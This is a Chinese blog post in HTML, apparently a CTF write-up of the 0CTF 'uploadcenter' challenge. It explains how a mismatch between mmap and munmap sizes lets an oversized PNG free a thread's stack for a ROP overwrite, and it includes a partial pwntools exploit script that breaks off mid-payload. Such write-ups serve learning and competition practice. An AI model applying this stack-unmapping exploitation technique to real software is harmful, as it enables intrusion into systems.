@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>0CTF uploadcenter - Luexp</title><meta name="Description" content="Luexp&#39;s blog"><meta property="og:title" content="0CTF uploadcenter" />
+<meta property="og:description" content="一道做了许久的题目，涉及的知识挺多的。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/0ctf-uploadcenter/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-05-13T17:34:31+00:00" />
+<meta property="article:modified_time" content="2020-05-13T17:34:31+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="0CTF uploadcenter"/>
+<meta name="twitter:description" content="一道做了许久的题目，涉及的知识挺多的。"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/0ctf-uploadcenter/" /><link rel="prev" href="http://example.org/kernel%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF-%E4%BA%8C/" /><link rel="next" href="http://example.org/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "0CTF uploadcenter",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/0ctf-uploadcenter\/"
+        },"genre": "posts","keywords": "pwn, wp","wordcount":  2691 ,
+        "url": "http:\/\/example.org\/0ctf-uploadcenter\/","datePublished": "2020-05-13T17:34:31+00:00","dateModified": "2020-05-13T17:34:31+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Luexp"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Luexp"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/logo.png"
+        data-srcset="/logo.png, /logo.png 1.5x, /logo.png 2x"
+        data-sizes="auto"
+        alt="/logo.png"
+        title="/logo.png" />Luexp&#39;s Life</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="GO!"> 文章 </a><a class="menu-item" href="/tags/" title="BIU!"> 标签 </a><a class="menu-item" href="/categories/" title="BOOM!"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Luexp"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/logo.png"
+        data-srcset="/logo.png, /logo.png 1.5x, /logo.png 2x"
+        data-sizes="auto"
+        alt="/logo.png"
+        title="/logo.png" />Luexp&#39;s Life</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="GO!">文章</a><a class="menu-item" href="/tags/" title="BIU!">标签</a><a class="menu-item" href="/categories/" title="BOOM!">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">0CTF uploadcenter</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Luexp</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>ctf</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-05-13">2020-05-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2691 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#png文件结构">PNG文件结构</a></li>
+    <li><a href="#线程互锁和消息">线程互锁和消息</a></li>
+    <li><a href="#线程栈的分配">线程栈的分配</a></li>
+    <li><a href="#mmap和munmap">mmap和munmap</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#保护机制">保护机制</a></li>
+    <li><a href="#漏洞分析">漏洞分析</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>一道做了许久的题目，涉及的知识挺多的。</p>
+<h1 id="涉及知识">涉及知识</h1>
+<ul>
+<li>PNG文件结构</li>
+<li>线程互锁和消息</li>
+<li>线程栈的分配</li>
+<li>mmap和munmap</li>
+</ul>
+<p>在开始分析程序之前，先对涉及的知识做一个简单的介绍，也算是对知识的总结。</p>
+<h2 id="png文件结构">PNG文件结构</h2>
+<p>PNG文件是由魔术和若干数据块构成的。</p>
+<p>PNG的魔术为：</p>
+<p>89 50 4E 47 0D 0A 1A 0A</p>
+<p>数据块中最主要的数据块是IHDR，PLTE，IDAT，IEND。每个数据块又由一下四个部分构成，其中数据块类型码标记数块的类型，如IHDR数据块，这个字段就是‘IHDR’字符串，IDAT数据块，这个字段就是‘IDAT’字符串</p>
+<table>
+<thead>
+<tr>
+<th><strong>名称</strong></th>
+<th><strong>字节数</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Length (长度)</td>
+<td>4字节</td>
+<td>指定数据块中数据域的长度，其长度不超过(231－1)字节</td>
+</tr>
+<tr>
+<td>Chunk Type Code (数据块类型码)</td>
+<td>4字节</td>
+<td>数据块类型码由ASCII字母(A-Z和a-z)组成</td>
+</tr>
+<tr>
+<td>Chunk Data (数据块数据)</td>
+<td>可变长度</td>
+<td>存储按照Chunk Type Code指定的数据</td>
+</tr>
+<tr>
+<td>CRC (循环冗余检测)</td>
+<td>4字节</td>
+<td>存储用来检测是否有错误的循环冗余码</td>
+</tr>
+</tbody>
+</table>
+<p><strong>IHDR</strong>是文件头数据块，主要包含了PNG图片的一些基本信息，如图像宽度，图像高度，图像深度等。</p>
+<table>
+<thead>
+<tr>
+<th><strong>域的名称</strong></th>
+<th><strong>字节数</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Width</td>
+<td>4 bytes</td>
+<td>图像宽度，以像素为单位</td>
+</tr>
+<tr>
+<td>Height</td>
+<td>4 bytes</td>
+<td>图像高度，以像素为单位</td>
+</tr>
+<tr>
+<td>Bit depth</td>
+<td>1 byte</td>
+<td>图像深度： 索引彩色图像：1，2，4或8 灰度图像：1，2，4，8或16 真彩色图像：8或16</td>
+</tr>
+<tr>
+<td>Color Type</td>
+<td>1 byte</td>
+<td>颜色类型： 0：灰度图像, 1，2，4，8或16 2：真彩色图像，8或16 3：索引彩色图像，1，2，4或8 4：带α通道数据的灰度图像，8或16 6：带α通道数据的真彩色图像，8或16</td>
+</tr>
+<tr>
+<td>Compression method</td>
+<td>1 byte</td>
+<td>压缩方法(LZ77派生算法)</td>
+</tr>
+<tr>
+<td>Filter method</td>
+<td>1 byte</td>
+<td>滤波器方法</td>
+</tr>
+<tr>
+<td>Interlace method</td>
+<td>1 byte</td>
+<td>隔行扫描方法： 0：非隔行扫描 1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>PLTE</strong>是调色板数据块包含有与索引彩色图像相关的彩色变换数据，它仅仅与索引的彩色图像有关，而且需要放在IDAT之前。</p>
+<p><strong>IDAT</strong>是图像数据块，用于储存实际的数据。</p>
+<p><strong>IEND</strong>是图像结束数据，用于标记PNG数据流的结尾，该段必须放在文件的尾部。通常这个数据段没有数据，所以一般这个段的内容是：00 00 00 00 49 45 4E 44 AE 42 60 82。前四个自己是数据段长度，因为没有数据，所以为0，中间四个字节是‘IEND’，最后四个字节是CRC结果。</p>
+<h2 id="线程互锁和消息">线程互锁和消息</h2>
+<p>当两个线程同时访问一个全局变量时，如果不用互锁就会发送问题，比如A线程和B线程都对变量C进行加1操作，理论上来说C最后应该加2，但是如果A和B线程对C同时操作的话，C的最后结果是未知的。为了解决这样的问题，我们给线程加上了一个互锁机制，当A线程访问C时将会请求对mutex（Mutual exclusion）加锁，而当B访问C时，同样会有加锁请求，但是其以及被A加锁了，所以只能等待其解锁后再操作。这里需要用到的两个函数分别是：pthread_mutex_lock() pthread_mutex_unlock()</p>
+<p>线程的消息机制是指当一个线程对一个队列等数据结构操作时，发现队列里面没有数据，于是解锁mutex并进入休眠，当队列里面有数据时，唤醒线程，并对mutex加锁。与这个操作有关的函数是：pthread_cond_wait（） pthread_cond_signal（）</p>
+<h2 id="线程栈的分配">线程栈的分配</h2>
+<p>对于多线程的程序，每个线程都有自己独立的栈空间，栈空间的大小可以用ulimit -a来查询。为了防止栈溢出，在栈顶其还分配了一个0x1000大小的空间，该空间没有权限，所以如果栈的访问超过了栈空间大小，而访问了这个0x1000的空间，会发送段错误。</p>
+<h2 id="mmap和munmap">mmap和munmap</h2>
+<p>mmap在分配时是向低字节生长的，这和heap分配的方式不同。并且mmap分配的空间当释放后会直接返回给操作系统，而不会像heap，会有bins管理机制。</p>
+<h1 id="程序分析">程序分析</h1>
+<h2 id="保护机制">保护机制</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/05/20/kwBWnf7ljYAFqZv.png"
+        data-srcset="https://i.loli.net/2020/05/20/kwBWnf7ljYAFqZv.png, https://i.loli.net/2020/05/20/kwBWnf7ljYAFqZv.png 1.5x, https://i.loli.net/2020/05/20/kwBWnf7ljYAFqZv.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/05/20/kwBWnf7ljYAFqZv.png"
+        title="image-20200513182334383" /></p>
+<p>没有开启PIE，开启部分RELRO</p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>程序是一个上传gzip压缩的png图片，并用mmap的空间来储存。但是程序mmap的空间大小是由png图片IHDR数据块里面width和height数据来决定的，而munmap的大小是根据png数据块的大小来释放的。如果png数据块的大小大于width*height，那么将会多释放一些空间，如果这些空间有特殊用处的话，就存在UAF漏洞。</p>
+<p>那么如何让图片后面的空间有用处呢？</p>
+<p>我们继续看程序的功能，程序有个monitor_file（），其将会开启一个线程来监视是否有新的文件上传。</p>
+<p>根据上面的知识介绍，我们知道线程的栈也是用mmap来分配的，那么如果我们让图片的数据和stack的空间相邻，是否就可以将栈的数据给free掉，再之后重新上传图片以覆盖栈内数据呢？</p>
+<p>我们测试一下。这是没有开启monitor_file时内存的情况：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/05/20/DhIGv19cs4yXzxM.png"
+        data-srcset="https://i.loli.net/2020/05/20/DhIGv19cs4yXzxM.png, https://i.loli.net/2020/05/20/DhIGv19cs4yXzxM.png 1.5x, https://i.loli.net/2020/05/20/DhIGv19cs4yXzxM.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/05/20/DhIGv19cs4yXzxM.png"
+        title="image-20200513184808893" /></p>
+<p>当我们调用monitor_file后：（由于不是一次调试的结果，所以可能地址不一样，但是主要是看大小的变化）</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/05/20/GVAKZr2IJh6xfS5.png"
+        data-srcset="https://i.loli.net/2020/05/20/GVAKZr2IJh6xfS5.png, https://i.loli.net/2020/05/20/GVAKZr2IJh6xfS5.png 1.5x, https://i.loli.net/2020/05/20/GVAKZr2IJh6xfS5.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/05/20/GVAKZr2IJh6xfS5.png"
+        title="image-20200513185018046" /></p>
+<p>可以看到第二个箭头对应的大小从1e00000变成了1600000，增加的大小刚好是800000即8MB，刚好是该系统规定的线程栈大小。第一个箭头的0x1000就是用来保护栈的，防止栈溢出超过8MB。</p>
+<p>我们再上传一个图片：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/05/20/atPHbrCEzjF7hZV.png"
+        data-srcset="https://i.loli.net/2020/05/20/atPHbrCEzjF7hZV.png, https://i.loli.net/2020/05/20/atPHbrCEzjF7hZV.png 1.5x, https://i.loli.net/2020/05/20/atPHbrCEzjF7hZV.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/05/20/atPHbrCEzjF7hZV.png"
+        title="image-20200513185357531" /></p>
+<p>我们上传了一个9MB大小的图片，但是width和height分别只有1024所以只分配了1MB的空间。我们再查看一下当前线程的栈地址：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/05/20/a3R5wVnk1LMFO2J.png"
+        data-srcset="https://i.loli.net/2020/05/20/a3R5wVnk1LMFO2J.png, https://i.loli.net/2020/05/20/a3R5wVnk1LMFO2J.png 1.5x, https://i.loli.net/2020/05/20/a3R5wVnk1LMFO2J.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/05/20/a3R5wVnk1LMFO2J.png"
+        title="image-20200513185533839" /></p>
+<p>当前线程的rsp指向了0x7f4d93437f00如果我们想要利用该程序的漏洞，就需要将这一部分也给释放掉。我们计算一下rsp到图片地址的大小0x7f4d93437f00-0x7f4d92b38000=0x8fff00，如果图片的IDAT的数据为9MB超过了0x8fff00，所以该线程的栈会被我们释放掉。我们删除图片然后来观察一下内存情况：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/05/20/H9cEMAyB1kGXfoT.png"
+        data-srcset="https://i.loli.net/2020/05/20/H9cEMAyB1kGXfoT.png, https://i.loli.net/2020/05/20/H9cEMAyB1kGXfoT.png 1.5x, https://i.loli.net/2020/05/20/H9cEMAyB1kGXfoT.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/05/20/H9cEMAyB1kGXfoT.png"
+        title="image-20200513192628766" /></p>
+<p>可以看到我们把线程的栈也给释放掉了。如此我们就可以修改线程栈的信息了（注意：这里之所以线程没有崩溃掉，是因为线程进入了等待消息的状态，也就是进入了休眠）。我们计算一下线程栈地址到mmap顶部的距离，计算得0x1100，同时我们是将png的全部内容复制到mmap的空间里，当我们计算rop链时，需要减掉png头部的信息。如此我们就可以写出exp。</p>
+<h1 id="exp">EXP</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">zlib</span>
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+	<span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">()</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./uploadcenter&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;I386&#39;</span><span class="p">]:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./uploadcenter&#39;</span><span class="p">)</span>
+<span class="c1"># gdb.attach(sh,&#39;&#39;&#39;</span>
+<span class="c1"># c</span>
+<span class="c1"># &#39;&#39;&#39;)</span>
+<span class="k">def</span> <span class="nf">choice</span><span class="p">(</span><span class="n">election</span><span class="p">):</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;6 :) Monitor File</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">election</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">genPngEx</span><span class="p">(</span><span class="n">width</span><span class="p">,</span><span class="n">height</span><span class="p">,</span><span class="n">bit_depth</span><span class="p">,</span><span class="n">color_type</span><span class="p">,</span><span class="n">i_data</span><span class="p">,</span><span class="n">data_length</span><span class="p">):</span>
+	<span class="n">comprMethod</span><span class="o">=</span><span class="mi">0</span>
+	<span class="n">filterMthod</span><span class="o">=</span><span class="mi">0</span>
+	<span class="n">interlaceMehod</span><span class="o">=</span><span class="mi">0</span>
+	<span class="c1">#magic</span>
+	<span class="n">i_magic</span><span class="o">=</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&gt;Q&#39;</span><span class="p">,</span><span class="mh">0x89504E470D0A1A0A</span><span class="p">)</span>
+	<span class="c1">#IHDR</span>
+	<span class="n">ihdr</span><span class="o">=</span><span class="s1">&#39;IHDR&#39;</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&gt;I&#39;</span><span class="p">,</span><span class="n">width</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&gt;I&#39;</span><span class="p">,</span><span class="n">height</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">bit_depth</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">color_type</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">comprMethod</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">filterMthod</span><span class="p">)</span><span class="o">+</span>\
+	<span class="nb">chr</span><span class="p">(</span><span class="n">interlaceMehod</span><span class="p">)</span>
+	<span class="n">ihdr</span><span class="o">=</span><span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ihdr</span><span class="p">)</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">ihdr</span><span class="o">+</span><span class="s1">&#39;AAAA&#39;</span>	
+	<span class="c1">#IDAT</span>
+	<span class="n">idat</span><span class="o">=</span><span class="n">p32</span><span class="p">(</span><span class="n">data_length</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;IDAT&#39;</span><span class="o">+</span><span class="n">i_data</span><span class="o">+</span><span class="s1">&#39;AAAA&#39;</span>
+	<span class="c1">#IEND</span>
+	<span class="n">iend</span><span class="o">=</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;IEND&#39;</span><span class="o">+</span><span class="s1">&#39;AAAA&#39;</span>
+
+	<span class="k">return</span> <span class="n">i_magic</span><span class="o">+</span><span class="n">ihdr</span><span class="o">+</span><span class="n">idat</span><span class="o">+</span><span class="n">iend</span>
+
+<span class="k">def</span> <span class="nf">genPng</span><span class="p">(</span><span class="n">width</span><span class="p">,</span><span class="n">height</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
+	<span class="n">data_length</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+	<span class="k">return</span> <span class="n">genPngEx</span><span class="p">(</span><span class="n">width</span><span class="p">,</span><span class="n">height</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">data_length</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">add_png</span><span class="p">(</span><span class="n">width</span><span class="p">,</span><span class="n">height</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+	<span class="n">png</span><span class="o">=</span><span class="n">zlib</span><span class="o">.</span><span class="n">compress</span><span class="p">(</span><span class="n">genPng</span><span class="p">(</span><span class="n">width</span><span class="p">,</span><span class="n">height</span><span class="p">,</span><span class="n">data</span><span class="p">))</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">png</span><span class="p">)))</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">png</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">monitor_file</span><span class="p">():</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">delete_file</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="n">mutex</span><span class="o">=</span><span class="mh">0x000000000060E160</span>
+<span class="n">cond</span><span class="o">=</span><span class="mh">0x000000000060E1A0</span>
+<span class="n">rdi_ret</span><span class="o">=</span><span class="mh">0x00000000004038b1</span>
+<span class="n">puts_plt</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">puts_got</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">exit</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;exit&#39;</span><span class="p">]</span>
+<span class="n">mutex_unlock</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;pthread_mutex_unlock&#39;</span><span class="p">]</span>
+<span class="n">sleep</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;sleep&#39;</span><span class="p">]</span>
+<span class="k">def</span> <span class="nf">rop</span><span class="p">(</span><span class="n">ropchain</span><span class="p">,</span><span class="n">index</span><span class="p">):</span>
+	<span class="n">monitor_file</span><span class="p">()</span>
+	<span class="n">add_png</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span><span class="mi">1024</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="o">*</span><span class="mi">9</span><span class="p">)</span>
+	<span class="n">delete_file</span><span class="p">(</span><span class="n">index</span><span class="p">)</span>
+	<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="o">-</span><span class="mh">0x1100</span><span class="o">-</span><span class="mh">0x29</span><span class="p">)</span>
